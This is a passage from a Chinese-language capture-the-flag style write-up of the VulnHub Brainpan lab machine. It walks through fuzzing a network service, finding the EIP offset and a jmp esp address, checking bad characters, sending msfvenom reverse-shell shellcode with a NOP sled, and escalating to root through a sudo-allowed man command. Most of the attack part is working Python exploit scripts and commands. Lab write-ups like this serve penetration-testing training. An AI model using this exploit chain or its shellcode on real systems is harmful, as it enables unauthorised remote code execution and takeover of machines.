title="2.验证缓冲区溢出漏洞"></a>2.验证缓冲区溢出漏洞</h2><p>验证缓冲区溢出漏洞的基本思路：<br>利用代码进行fuzz找出是否存在缓冲区溢出漏洞（即查看能否控制EIP），并进行之后的确定偏移量、确定返回地址、生成shellcode。</p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><p>向目标程序发送很长的字符串，直到程序崩溃，确认导致程序崩溃的大概字符串长度。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockethost<span class="token operator">=</span><span class="token string">'192.168.71.146'</span>port<span class="token operator">=</span><span class="token number">9999</span><span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b"A"</span><span class="token punctuation">]</span>counter <span class="token operator">=</span> <span class="token number">100</span><span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">50</span><span class="token punctuation">:</span>    <span class="token builtin">buffer</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">b"A"</span> <span class="token operator">*</span> counter<span class="token punctuation">)</span>    counter <span class="token operator">=</span> counter <span class="token operator">+</span> <span class="token number">100</span><span class="token keyword">for</span> string <span class="token keyword">in</span> <span class="token builtin">buffer</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Fuzzing PASS with &#123;&#125; bytes"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>string<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102092317432.png"></p><p><img src="/posts/229625f/image-20221102092332545.png"></p><p><img src="/posts/229625f/image-20221102092353514.png"></p><p><img src="/posts/229625f/image-20221102092410868.png"></p><p>当发送字符串长度为600字节时，程序崩溃。在debugger中可以看到栈和EIP都被“A”（0x41）填满，即控制了EIP，使其指向了非法地址。</p><h3 id="确定偏移量"><a href="#确定偏移量" class="headerlink" title="确定偏移量"></a>确定偏移量</h3><p>确定多长的字符串可以刚好覆盖EIP。<br>利用kali的工具msf-pattern_create创建长度为600的字符串，发送给程序。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf-pattern_create <span class="token parameter variable">-l</span> <span class="token number">600</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102092513918.png"></p><p><img src="/posts/229625f/image-20221102092528409.png"></p><p>发送完成后，发现EIP的值为35724134<br>利用msf-pattern_offset 工具确认偏移位置，偏移为524。</p><p><img src="/posts/229625f/image-20221102092605952.png"></p><h3 id="确定返回地址"><a href="#确定返回地址" class="headerlink" title="确定返回地址"></a>确定返回地址</h3><p>通过构造发送的字符串，EIP覆盖为想要跳转执行的代码。<br>当EIP执行”jmp esp”时，程序会接下来跳转到esp所指向的内存执行，实际上就是“返回地址”在栈里的上一个地址，由于操作系统保护机制，esp的地址是不能写死的，所以要找到程序中有没有“jmp esp”的地址可以利用。<br>这里要用到Immunity Debugger的mona插件，下载地址：<a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a></p><p>安装好后，在debugger下方的指令框中输入！mona modules，它会显示出所有运行程序的保护机制开启情况。选择前四项都为false的程序，就是可进行代码地址利用的程序。</p><p><img src="/posts/229625f/image-20221102092810528.png"></p><p>看到brainpan.exe程序可以利用，使用nasm_shell来获得jmp esp的十六进制指令：</p><p><img src="/posts/229625f/image-20221102092838800.png"></p><p>为”\xff\xe4”，使用mona来寻找指令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona <span class="token function">find</span> <span class="token parameter variable">-s</span> <span class="token string">"<span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xe4">\xe4</span>"</span> <span class="token parameter variable">-m</span> brainpan.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102092928811.png"></p><p>找到了指令的位置为0x311712f3<br>因为brainpan为windows 32位小端序，所以传入EIP的值应该为\xf3\x12\x17\x31</p><h3 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h3><p>在生成shellcode前，要确定程序中有哪些“坏字符”，即不能作为代码使用的字符，每个程序中是不一样的，要在生成shellcode时避免这些字符导致的反弹shell失败。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockethost<span class="token operator">=</span><span class="token string">'192.168.71.146'</span>port<span class="token operator">=</span><span class="token number">9999</span>badchars <span class="token operator">=</span> <span class="token punctuation">(</span>        <span class="token string">b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x00"</span>        <span class="token string">b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10"</span>        <span class="token string">b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20"</span>        <span class="token string">b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30"</span>        <span class="token string">b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x40"</span>        <span class="token string">b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50"</span>        <span class="token string">b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60"</span>        <span class="token string">b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70"</span>        <span class="token string">b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80"</span>        <span class="token string">b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90"</span>        <span class="token string">b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0"</span>        <span class="token string">b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0"</span>        <span class="token string">b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0"</span>        <span class="token string">b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0"</span>        <span class="token string">b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0"</span>        <span class="token string">b"\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0"</span><span class="token punctuation">)</span>buff <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">524</span> <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> badcharss <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在esp处右键“follow in dump”中可以看到填入的badchars，但是发现在”\x00”处被截断了，不是本来的”\x11”，说明”\x00”是坏字符。<br>将”\x00”改成”\x01”再次发送，经过排查一切正常，没有其他的坏字符了。</p><p>利用kali的msfvenom生成shellcode，记得加-b参数排除掉坏字符。<br>直接生成靶机linux系统的shellcode。</p><p><img src="/posts/229625f/image-20221102093030822.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>发送给靶机，再加一段nop雪橇保护shellcode。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> socketip <span class="token operator">=</span> <span class="token string">"192.168.71.145"</span>port <span class="token operator">=</span> <span class="token number">9999</span>addr <span class="token operator">=</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>buf <span class="token operator">=</span>  <span class="token string">b""</span>buf <span class="token operator">+=</span> <span class="token string">b"\xdb\xc4\xd9\x74\x24\xf4\xb8\x81\xbe\x52\xf0\x5e\x2b"</span>buf <span class="token operator">+=</span> <span class="token string">b"\xc9\xb1\x12\x83\xee\xfc\x31\x46\x13\x03\xc7\xad\xb0"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x05\xf6\x0a\xc3\x05\xab\xef\x7f\xa0\x49\x79\x9e\x84"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x2b\xb4\xe1\x76\xea\xf6\xdd\xb5\x8c\xbe\x58\xbf\xe4"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x80\x33\x78\x7f\x68\x46\x87\x6e\x35\xcf\x66\x20\xa3"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x9f\x39\x13\x9f\x23\x33\x72\x12\xa3\x11\x1c\xc3\x8b"</span>buf <span class="token operator">+=</span> <span class="token string">b"\xe6\xb4\x73\xfb\x27\x26\xed\x8a\xdb\xf4\xbe\x05\xfa"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x48\x4b\xdb\x7d"</span>buff <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">524</span> <span class="token operator">+</span> <span class="token string">b'\xf3\x12\x17\x31'</span> <span class="token operator">+</span> <span class="token string">b"\x90"</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> bufs <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Payload send complete!"</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送完成后，kali收到来自靶机的连接，成功反弹shell！</p><h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>可以用下面的命令切换成tty.不然的话会没有上下文环境，很多命令执行不了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">"__import__('pty').spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102093155747.png"></p><p>从反弹的shell中可以看到当前权限为名为punk的用户。<br><strong>sudo -l 命令</strong>：查看授权的命令列表<br>可以看到&#x2F;home&#x2F;anansi&#x2F;bin&#x2F;anansi_util 命令可以无密码执行。</p><p><img src="/posts/229625f/image-20221102093222310.png"></p><p>执行一下这个命令</p><p><img src="/posts/229625f/image-20221102093320764.png"></p><p>依次执行看了一下，三个参数分别相当于以下命令</p><ul><li>ip a&#x2F;ipconfig 命令</li><li>top</li><li>man</li></ul><p>利用man命令进行权限提升，先执行man，再执行!&#x2F;bin&#x2F;sh，获得root权限。</p><p><img src="/posts/229625f/image-20221102093633412.png"></p><p>查看root文件夹下的证明文件b.txt</p><p><img src="/posts/229625f/image-20221102093708826.png"></p><p><strong>恭喜VulnHub的第一台靶机完成！！！！</strong></p>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
